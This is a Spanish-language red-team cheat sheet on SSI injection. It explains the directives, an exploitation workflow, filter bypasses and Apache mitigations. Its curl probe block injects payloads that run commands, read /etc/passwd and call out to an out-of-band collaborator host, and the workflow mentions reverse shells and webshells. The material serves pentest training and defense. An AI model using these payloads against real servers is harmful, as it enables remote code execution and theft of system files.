---
aliases:
  - SSI Injection
  - Server-Side Includes Injection
  - SSI
tags:
  - vuln/ssi
  - technique/execution
  - technique/collection
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación|Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: CheatSheet
linked:
  - "[[SSI - Deteccion y Reconocimiento]]"
  - "[[SSI - Ejecucion de Comandos]]"
  - "[[SSI - Inclusion de Archivos]]"
  - "[[SSI - Information Gathering]]"
  - "[[SSI - Evasion de Filtros]]"
  - "[[SSI - Tooling]]"
  - "[[File Inclusion]]"
---
# Server-Side Includes (SSI) Injection

---

## Cheatsheet

### 1. Detección y Reconocimiento

#### Recon activo

````tabs
tab: **Identificar SSI Habilitado**
![[SSI - Deteccion y Reconocimiento#^ssi-detect-enabled]]

tab: **Probes Iniciales**
![[SSI - Deteccion y Reconocimiento#^ssi-detect-probes]]

tab: **Fingerprint del Server (Recon Profundo)**
![[SSI - Deteccion y Reconocimiento#^ssi-detect-fingerprint]]
````

### 2. Explotación

#### 💀 Ejecución de Comandos (RCE)

````tabs
tab: **RCE Linux / Windows Básico**
![[SSI - Ejecucion de Comandos#^ssi-exec-basic]]

tab: **Reverse Shells**
![[SSI - Ejecucion de Comandos#^ssi-exec-revshell]]

tab: **OOB Exfil (Blind RCE)**
![[SSI - Ejecucion de Comandos#^ssi-exec-oob]]

tab: **Requisitos para exec**
![[SSI - Ejecucion de Comandos#^ssi-exec-requirements]]
````

#### 📁 Inclusión de Archivos

````tabs
tab: **include virtual (URL-Relative)**
![[SSI - Inclusion de Archivos#^ssi-include-virtual]]

tab: **include file (Filesystem-Relative)**
![[SSI - Inclusion de Archivos#^ssi-include-file]]

tab: **LFI Chain via SSI**
![[SSI - Inclusion de Archivos#^ssi-include-lfi-chain]]
````

#### 📋 Information Gathering

````tabs
tab: **echo Environment Variables**
![[SSI - Information Gathering#^ssi-info-echo]]

tab: **fsize y flastmod (Filesystem Enum)**
![[SSI - Information Gathering#^ssi-info-fsize]]

tab: **printenv y config**
![[SSI - Information Gathering#^ssi-info-printenv]]
````

#### 🔓 Evasión de Filtros

````tabs
tab: **Whitespace Tricks**
![[SSI - Evasion de Filtros#^ssi-bypass-whitespace]]

tab: **set Concatenation**
![[SSI - Evasion de Filtros#^ssi-bypass-set-concat]]

tab: **Inyección via Filename / Headers**
![[SSI - Evasion de Filtros#^ssi-bypass-filename-headers]]

tab: **Encoding y CGI Fallback**
![[SSI - Evasion de Filtros#^ssi-bypass-encoding-cgi]]
````

### 3. Tooling

#### 🛠️ Tooling

````tabs
tab: **Burp Intruder + Active Scan**
![[SSI - Tooling#^ssi-tool-burp]]

tab: **Wordlists**
![[SSI - Tooling#^ssi-tool-wordlists]]

tab: **Manual curl / Custom Scripts**
![[SSI - Tooling#^ssi-tool-curl]]
````

---

## Overview

**Server-Side Includes (SSI)** es legacy directiva del webserver (Apache `mod_include`, IIS SSI module) que permite embeber contenido dinámico en archivos HTML sin lenguaje backend completo. Files con extensión `.shtml`, `.shtm`, `.stm` (o configured handler) son parsed por el server, processing directives como `<!--#exec cmd="..." -->`, `<!--#include virtual="..." -->`, `<!--#echo var="..." -->`.

**SSI Injection** = atacante inyecta directivas SSI en input reflected dentro de archivo SSI-handled. Server parsea + ejecuta → RCE potencial, file read, info disclosure.

OWASP Testing Guide — OTG-INPVAL-009. Vector legacy pero aún encontrado en stacks Apache antiguos, intranets, dashboards educacionales.

### Directivas SSI principales

| Directiva | Función |
|---|---|
| `#exec cmd="..."` | Execute shell command |
| `#include virtual="..."` | Include via URL (triggers handlers) |
| `#include file="..."` | Include from filesystem (raw) |
| `#echo var="..."` | Print CGI variable |
| `#printenv` | Dump all env vars |
| `#fsize file="..."` | File size |
| `#flastmod file="..."` | File last-modified time |
| `#set var="..." value="..."` | Define local var |
| `#config ...` | Customize output formats |
| `#if`/`#elif`/`#else`/`#endif` | Conditional logic |

### Diferencia con vulns relacionadas

| | **SSI Injection** | **PHP/SSTI** | **LFI** |
|---|---|---|---|
| Lenguaje | SSI directives | PHP/Jinja/Twig/etc | Direct file include |
| Trigger | `.shtml` parsed by mod_include | `.php` parsed by PHP | Any file include |
| Stack | Apache/IIS mod_include | Backend language | Per-language |
| Vector | Reflected input en .shtml | Reflected input en template | Path traversal |
| Common impact | RCE / LFI | RCE | File disclosure / RCE |

---

## Workflow de explotación

```
1. Identificar SSI active:
   - Extensión .shtml/.shtm/.stm
   - Server header Apache/IIS con mod_include
   - Probe con <!--#echo var="DATE_LOCAL" -->

2. Confirm parse + reflection:
   - Inyect en form/header/URL
   - Verify directive renders (date, env var, etc.)

3. Determine capability:
   - #exec works? → RCE direct
   - +IncludesNOEXEC? → use #include
   - Filter active? → bypass via whitespace/concat

4. Decidir vector:
   a. RCE via #exec → reverse shell
   b. LFI via #include → source disclosure
   c. Info gathering via #echo/#printenv
   d. Filesystem enum via #fsize/#flastmod

5. Bypass filtros si applicable:
   - Whitespace fragmentation
   - #set concatenation
   - Filename/header injection
   - CGI fallback

6. Escalation:
   - LFI to RCE chain (upload + include)
   - OOB exfil for blind
   - Stored SSI (persistent)
```

---

## Indicadores en Código (defensa)

### Indicadores en código backend

```apache
# Apache config — VULNERABLE
<Directory /var/www>
    Options +Includes
    AddHandler server-parsed .shtml
</Directory>

# Apache config — SAFE
<Directory /var/www>
    Options -Includes
</Directory>

# Mitigación parcial
<Directory /var/www>
    Options +IncludesNOEXEC  # Allows SSI but not exec
</Directory>
```

### Probes mínimos

```bash
# 1. Identify .shtml endpoints
curl -sI 'https://target/page.shtml' | grep -i 'content-type'
# text/html with .shtml → SSI candidate

# 2. SSI active probe (passive)
curl --data-urlencode 'q=<!--#echo var="DATE_LOCAL" -->' \
     'https://target/search.shtml'
# Response shows date → SSI active

# 3. RCE probe
curl --data-urlencode 'q=<!--#exec cmd="id" -->' \
     'https://target/search.shtml'
# Response shows `uid=...` → RCE

# 4. LFI probe (NOEXEC bypass)
curl --data-urlencode 'q=<!--#include file="/etc/passwd" -->' \
     'https://target/search.shtml'

# 5. OOB blind
COLLAB=$(./interactsh-client -url-only)
curl --data-urlencode "q=<!--#exec cmd=\"curl http://$COLLAB/\" -->" \
     'https://target/search.shtml'
```

---

## Impacto

- **RCE en webserver context** — atacante = www-data / apache / IUSR.
- **File disclosure (LFI)** — read `/etc/passwd`, source code, configs.
- **Source disclosure** — read `.bak`, `.old`, `.swp`.
- **Info gathering** — server version, paths, env vars.
- **Reverse shell** — direct interactive shell.
- **Persistencia** — drop webshell via include + upload chain.
- **Stored SSI** — persistent injection en stored fields.
- **OOB exfil** — DNS / HTTP callback even sin output.
- **Combine con file upload** — upload .shtml + trigger.
- **Combine con LFI** — chain to RCE via SSI exec.

---

## Mitigación (defender)

- **Disable SSI globally si no se usa**:
  ```apache
  <Directory /var/www>
      Options -Includes
  </Directory>
  ```
- **Use `+IncludesNOEXEC`** — allows SSI pero blocks `#exec`:
  ```apache
  <Directory /var/www>
      Options +IncludesNOEXEC
  </Directory>
  ```
- **Restrict SSI a .shtml only** — no parse other extensions:
  ```apache
  AddHandler server-parsed .shtml
  ```
- **Reject `<!--#` en user input** — block SSI directives at input layer.
- **Encode HTML entities en output**:
  ```python
  html.escape(user_input)  # < becomes &lt;
  ```
- **No reflejar input en archivos `.shtml`** — separate user data from server-parsed files.
- **WAF rules anti-SSI** — ModSecurity OWASP CRS includes.
- **Audit `mod_include` config** — periodic review.
- **Migrate legacy .shtml a modern stack** — PHP/Python/Node.js.
- **Per-vhost SSI scope** — disable globally, enable specific dirs only.
- **Use IIS handler restrictions** — limit SSI a specific paths.
- **File upload validation** — reject `.shtml` uploads.
- **Audit logs** — monitor for SSI directive patterns.

---

## Para entender SSI Injection

**Por qué SSI existe:**

SSI fue introducido en NCSA HTTPd y Apache early days (mid-90s) como simple template language pre-PHP/CGI. Permitía dynamic content sin full backend language. Casos de uso:
- Include common headers/footers
- Show server date/time
- Embed file size/last-modified
- Execute simple commands

Proliferated en static-ish sites, educational tutorials, intranets. Modern apps usan PHP/Python/Node — but legacy SSI persists, especially en old Apache configs.

**Por qué Injection ocurre:**

App con archivos `.shtml` reflejando user input → atacante puede inyectar SSI directives. Server parsea los archivos, encuentra `<!--#exec cmd="id" -->` literal en input rendered → ejecuta. SSI parser no distingue entre directives "legítimas" del template vs injected.

**Defensas comunes y bypasses:**

- `+IncludesNOEXEC`: blocks `#exec` only. `#include` aún functional → LFI vector.
- WAF blocks `<!--#exec`: bypass via whitespace `<!--# exec`, `#set` concatenation, encoding.
- Input filter blocks `<!--`: bypass via filename injection (filename rendered en directory listing en .shtml dashboard).

**Diferencia con SSTI:**

SSTI = template engine (Jinja2, Twig, etc.) injecting language constructs ejecutados by template engine. Resulting RCE en backend language (Python, PHP, Java).

SSI = legacy webserver directives ejecutados by mod_include. Resulting RCE en webserver shell context (no language interpreter).

Both están conceptually similar (template injection → RCE) pero distinct mechanisms y stacks.

---

## Recursos

- [OWASP Testing Guide - SSI Injection](https://owasp.org/www-project-web-security-testing-guide/v41/4-Web_Application_Security_Testing/07-Input_Validation_Testing/09-Testing_for_Server_Side_Includes) — OTG-INPVAL-009.
- [PortSwigger - SSI Injection](https://portswigger.net/kb/issues/00101200_server-side-includes-injection) — knowledge base.
- [PayloadsAllTheThings - SSI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Include%20Injection) — payloads.
- [HackTricks - SSI / ESI](https://book.hacktricks.xyz/pentesting-web/server-side-inclusion-edge-side-inclusion-injection) — referencia.
- [OWASP - SSI Injection](https://owasp.org/www-community/attacks/Server-Side_Includes_(SSI)_Injection) — overview.
- [Apache mod_include docs](https://httpd.apache.org/docs/current/mod/mod_include.html) — SSI reference.
- [Apache HOWTO mod_include](https://httpd.apache.org/docs/current/howto/ssi.html) — beginner guide.
- [CWE-97 - Improper Neutralization of SSI](https://cwe.mitre.org/data/definitions/97.html) — MITRE.

---
